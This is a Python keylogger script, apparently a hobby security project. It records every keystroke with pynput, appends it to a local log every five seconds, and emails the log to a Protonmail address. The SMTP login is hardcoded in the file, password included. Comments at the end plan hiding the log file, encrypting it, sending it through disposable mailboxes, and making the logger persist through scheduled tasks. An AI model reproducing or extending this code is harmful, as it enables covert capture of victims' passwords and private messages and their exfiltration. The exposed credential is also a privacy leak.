from pynput import keyboard

import datetime as dt
import threading
import requests

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Mailing Information
sender = 'cybersecprojectplus@protonmail.com'
recipient = 'cybersecprojectplus@protonmail.com'
smtp_server = 'smtp.protonmail.com'
smtp_port = 465
username = 'cybersecprojectplus@protonmail.com'
password = '^pVTK4^%obYBN8Lu'
subject = 'Logged Information'
body = 'Python Mail.'

string = ""

file_path = "C:\\Users\\richie\\PycharmProjects\\keylogger\\main.py"

def send_email(sender, recipient, subject, body, smtp_server, smtp_port, username, password, filename, attachment):
    # Set up the email message
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    # Set up the SMTP connection
    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
        server.login(username, password)
        server.sendmail(sender, recipient, msg.as_string())

    print('Email sent successfully.')

def on_press(key):
    global string
    try:
        if key == keyboard.Key.enter:
            string += "\n"
        elif key == keyboard.Key.tab:
            string += "\t"
        elif key == keyboard.Key.space:
            string += " "
        elif key == keyboard.Key.shift:
            pass
        # Skip if there is no data in string variable
        elif key == keyboard.Key.backspace and len(string) == 0:
            pass
        # Keeps logged keys up to date even with backspace
        elif key == keyboard.Key.backspace and len(string) > 0:
            string = string[:-1]
        elif key == keyboard.Key.esc:
            return False
        else:
            string += str(key).replace("'", "")
    except AttributeError:
        print(f'special key {key} pressed')


def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False


def log_data():
    global string
    threading.Timer(5.0, log_data).start()  # schedule next execution in 5 seconds
    with open('data.txt', 'a') as f:
        timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
        f.write(f'{timestamp}: {string}\n')
        string = ""


# Create a thread to periodically write data to the file
log_thread = threading.Thread(target=log_data)
log_thread.start()

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

send_email(sender, recipient, subject, body, smtp_server, smtp_port, username, password, 'data.txt', 'data.txt')

# Try to Obfuscate log file and content by randomly generating its name and keeping track of it in keylogger process
# - Encrypt data
# use disposable emails (IE mailinatior) to dump encrypted log files instead of main email
# This would make sure that your keylogger returns you a log file even
# after the computer has shutdown/restarted. If you made me, I would do it like this : Make a function to add the script
# to scheduled tasks then another function to log files. For logs I would create a directory to save logfiles to, create
# a subdirectory called old. Active log file goes to the /log/current-logfile.txt once it has been successfully sent its
# moved to old directory with a timestamp. /log/old/10-02-2020-logfile.txt .
